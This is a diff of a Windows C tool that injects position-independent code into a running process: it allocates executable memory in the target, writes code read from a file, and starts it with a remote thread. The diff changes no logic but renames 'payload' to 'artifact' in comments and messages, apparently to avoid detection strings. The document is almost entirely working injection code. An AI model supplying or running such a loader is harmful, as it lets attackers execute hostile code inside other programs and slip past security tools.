@@ -125,20 +125,20 @@ BOOL injectPIC(DWORD id, LPVOID code, DWORD codeLen) {
 
     if(hp == NULL) return FALSE;
 
-    // 3. allocate executable-read-write (XRW) memory for payload
-    printf("  [ allocating memory for payload.\n");
+    // 3. allocate executable-read-write (XRW) memory for artifact
+    printf("  [ allocating memory for artifact.\n");
     cs=VirtualAllocEx(hp, NULL, codeLen, 
       MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
     printf("  [ writing code to %p.\n", cs);
-    // 4. copy the payload to remote memory
+    // 4. copy the artifact to remote memory
     WriteProcessMemory(hp, cs, code, codeLen, &wr); 
     VirtualProtectEx(hp, cs, codeLen, PAGE_EXECUTE_READ, &t);
 
     printf("  [ press any key to continue.\n");
     getchar();
 
-    // 5. execute payload in remote process
+    // 5. execute artifact in remote process
     printf("  [ creating new thread.\n");
     nt = pRtlCreateUserThread(hp, NULL, FALSE, 0, NULL, 
       NULL, cs, NULL, &ht, &cid);
@@ -205,7 +205,7 @@ int main(int argc, char *argv[]){
     // pic
     code_len = getdata(argv[2], &code);
     if(code_len == 0) {
-      printf("  [ unable to read payload.\n");
+      printf("  [ unable to read artifact.\n");
       return 0;
     }
     injectPIC(pid, code, code_len);
